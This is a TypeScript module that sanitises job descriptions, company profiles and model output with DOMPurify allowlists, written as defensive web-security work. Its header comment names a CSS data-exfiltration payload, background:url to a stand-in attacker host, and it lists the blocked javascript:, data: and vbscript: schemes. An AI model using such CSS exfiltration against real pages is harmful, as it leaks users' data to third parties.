import DOMPurify from 'isomorphic-dompurify';

/**
 * Sanitiser for recruiter- and user-supplied rich text (job descriptions,
 * company profiles) that is rendered with dangerouslySetInnerHTML.
 *
 * DOMPurify's default configuration keeps the `style` attribute, so a job
 * description can still smuggle in CSS. That allows silent data exfiltration
 * (`background:url(https://attacker/?...)`) and layout spoofing over the page,
 * even though it cannot execute script. Presentation here comes from the
 * surrounding Tailwind typography classes, so inline styles are not needed and
 * the attribute is dropped along with every event handler.
 */
const ALLOWED_TAGS = [
  'p', 'br', 'hr', 'div', 'span',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li',
  'strong', 'b', 'em', 'i', 'u', 's',
  'blockquote', 'code', 'pre',
  'a',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
];

const ALLOWED_ATTR = ['href', 'title', 'target', 'rel', 'colspan', 'rowspan'];

export function sanitizeRichText(html: string): string {
  if (!html) return '';
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    // Only linkable schemes; blocks javascript:, data: and vbscript: hrefs.
    ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):/i,
    FORBID_ATTR: ['style'],
    FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed', 'form', 'input'],
  });
}

/**
 * Narrow allowlist used for assistant/model output rendered as inline markdown.
 */
export function sanitizeInlineMarkup(html: string): string {
  if (!html) return '';
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['strong', 'code', 'a', 'b', 'i', 'em'],
    ALLOWED_ATTR: ['href', 'class', 'target'],
    ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):|^\/(?!\/)/i,
    FORBID_ATTR: ['style'],
  });
}
